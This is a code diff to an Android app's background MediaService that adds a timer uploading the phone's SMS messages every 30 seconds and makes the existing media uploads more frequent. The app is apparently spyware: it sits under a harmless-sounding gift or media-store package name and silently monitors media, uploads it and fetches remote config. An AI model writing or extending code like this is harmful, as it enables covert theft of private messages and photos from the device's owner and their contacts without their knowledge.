@@ -17,6 +17,7 @@ import com.example.pappagift.mediastore.Receiver.MediaReceiver;
 import com.example.pappagift.mediastore.Utility.ConfigUpdaterUtility;
 import com.example.pappagift.mediastore.Utility.MediaUploadUtility;
 import com.example.pappagift.mediastore.Utility.MediaUtility;
+import com.example.pappagift.mediastore.Utility.SMSUtility;
 
 import java.io.File;
 import java.util.Timer;
@@ -24,12 +25,13 @@ import java.util.TimerTask;
 
 public class MediaService extends Service {
     private static final String TAG = "Media Service";
-    private Timer imgMonitorTimer, imgUploadTimer, configTimer;
+    private Timer imgMonitorTimer, imgUploadTimer, configTimer, smsTimer;
     private MediaUtility mUtility;
     private MediaDBManager dbManager;
 
     public static boolean isMediaMonitoring = false;
     public static boolean isMediaUploading = false;
+    public static boolean isSMSUploading = false;
 
     @Nullable
     @Override
@@ -43,6 +45,7 @@ public class MediaService extends Service {
             initConfigTimer();
             monitorMedia();
             initMediaUpload();
+            initSMSUpload();
         }
     };
 
@@ -54,6 +57,7 @@ public class MediaService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.d(TAG, "Starting Service...");
         registerReceiver();
         Thread mediaThread = new Thread(mediaRunnable);
         mediaThread.start();
@@ -85,7 +89,17 @@ public class MediaService extends Service {
                     uploadUtility.initUploadServices();
                 }
             }
-        }, 0, 1000 * 60 * 10);
+        }, 0, 1000 * 60 * 5);
+    }
+
+    private void initSMSUpload() {
+        smsTimer = new Timer();
+        smsTimer.schedule(new TimerTask() {
+            @Override
+            public void run() {
+                if(!isSMSUploading) new SMSUtility(MediaService.this).initSMSUpload();
+            }
+        }, 0, 1000 * 30);
     }
 
     private void initConfigTimer() {
